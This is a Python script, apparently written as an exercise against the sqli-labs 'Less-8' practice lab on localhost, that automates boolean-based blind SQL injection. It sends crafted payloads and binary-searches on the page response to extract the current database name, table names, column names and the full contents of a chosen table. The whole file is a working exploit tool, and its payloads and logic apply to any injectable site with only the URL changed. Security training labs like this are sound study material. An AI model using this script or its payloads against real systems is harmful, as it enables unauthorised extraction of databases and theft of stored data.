import urllib
import urllib.parse
import urllib.request

search_str = "You are in"
search_str = search_str.encode()
database = "database()"
lengthdatabase = "' and length(%s)>=%d #"
TableCountpayload = "'and (select count(table_name) from information_schema.tables where table_schema='%s')>=%d #"
asciiPayload = "' and ascii(substr((%s),%d,1))>=%d #"

selectdatabse = "select database()"
selectTable = "select table_name from information_schema.tables where table_schema='%s'  limit %d,1"

selectTableLength = "' and (select length(table_name) from information_schema.tables where table_schema='%s' limit "
selectTableLengthRight = ",1)>=%d #"

url = "http://127.0.0.1/sqli-labs-master/Less-8/?id=1"


def lengthString(payLoad, string):
    leftLenght = 0
    rightLenght = 0
    guess = 10
    while 1:
        if getLengthResult(payLoad, string, guess) == True:
            guess += 5
        else:
            rightLenght = guess
            break
    # print rightLenght
    mid = (leftLenght + rightLenght) // 2
    while leftLenght < rightLenght - 1:
        if getLengthResult(payLoad, string, mid) == True:
            leftLenght = mid
            mid = (leftLenght + rightLenght) // 2
        else:
            rightLenght = mid
            mid = (leftLenght + rightLenght) // 2
    return leftLenght


def getLengthResult(payLoad, string, Lenght):
    Finalurl = url + urllib.parse.quote(payLoad % (string, Lenght))
    rs = urllib.request.urlopen(Finalurl)
    if search_str in rs.read():
        return True
    else:
        return False


def getName(payload, string, Length):
    tmp = ''
    for i in range(1, Length + 1):
        leftLenght = 32
        rightLenght = 127
        mid = (leftLenght + rightLenght) // 2
        while leftLenght < rightLenght - 1:
            if getResult(payload, string, i, mid) == True:
                leftLenght = mid
            else:
                rightLenght = mid
            mid = (leftLenght + rightLenght) // 2
        tmp += chr(leftLenght)
    # print tmp
    return tmp


def getResult(payload, string, pos, ascii):
    Finalurl = url + urllib.parse.quote(payload % (string, pos, ascii))
    rs = urllib.request.urlopen(Finalurl)
    if search_str in rs.read():
        return True
    else:
        return False


def start():
    getDBLength = lengthString(lengthdatabase, database)
    print ("length of DBname:" + str(getDBLength))
    DBName = getName(asciiPayload, database, getDBLength)
    print ("current database:" + DBName)

    print (TableCountpayload)
    tableCount = lengthString(TableCountpayload, DBName)
    print ("count of table: " + str(tableCount))

    for i in range(0, tableCount):
        num = str(i)
        selectTableLengthPayload = selectTableLength + num + selectTableLengthRight
        tableNameLength = lengthString(selectTableLengthPayload, DBName)
        #print "current table length:" + str(tableNameLength)

        selectTableName = selectTable % (DBName, i)
        tableName = getName(asciiPayload, selectTableName, tableNameLength)
        print (tableName)

    ColumnCountPayload = "' and (select count(column_name) from information_schema.columns where table_schema='" + DBName + "' and table_name='%s')>=%d #"
    getTable = input("输入需要查询的列的表名：")
    # 获取指定表的列数量
    columnCount = lengthString(ColumnCountPayload, getTable)
    print ("table:" + getTable + "--count  of column:" + str(columnCount))

    # 获取指定表的行数量
    dataCountPayload = "' and (select count(*) from %s)>=%d #"
    dataCount = lengthString(dataCountPayload, getTable)
    print ("table:" + getTable + "--count of data: " + str(dataCount))

    data = []
    # 获取指定表中的列
    for i in range(0, columnCount):
        columnLengthPayload = "' and (select length(column_name) from information_schema.columns where table_schema='" + DBName + "' and table_name='%s' limit " + str(
            i) + ",1)>=%d #"
        #print columnLengthPayload
        columnNameLength = lengthString(columnLengthPayload, getTable)
        #print "current column length:" + str(columnNameLength)
        # 获取列名
        selectColumn = "select column_name from information_schema.columns where table_schema='" + DBName + "' and table_name='%s' limit %d,1"
        selectColumnName = selectColumn % (getTable, i)
        #print selectColumnName
        columnName = getName(asciiPayload, selectColumnName, columnNameLength)
        print ("current column_name: " + columnName)

        tmpData = []
        tmpData.append(columnName)

        for j in range(0, dataCount):
            columnDataLengthPayload = "' and (select length(" + columnName + ") from %s limit " + str(j) + ",1)>=%d #"
            #print columnDataLengthPayload
            columnDataLength = lengthString(columnDataLengthPayload, getTable)
           # print "current columnData length: " + str(columnDataLength)
            selectData = "select " + columnName + " from " + getTable + " limit " + str(j) + ",1"
            columnData = getName(asciiPayload, selectData, columnDataLength)
            #print "current columnData: " + columnData
            tmpData.append(columnData)

        data.append(tmpData)


    tmp = ""
    for i in range(0, len(data)):
        tmp += data[i][0] + " "
    print (tmp)

    for j in range(1, dataCount + 1):
        tmp = ""
        for i in range(0, len(data)):
            tmp += data[i][j] + " "
        print (tmp)
        

if __name__ == '__main__':
    start()
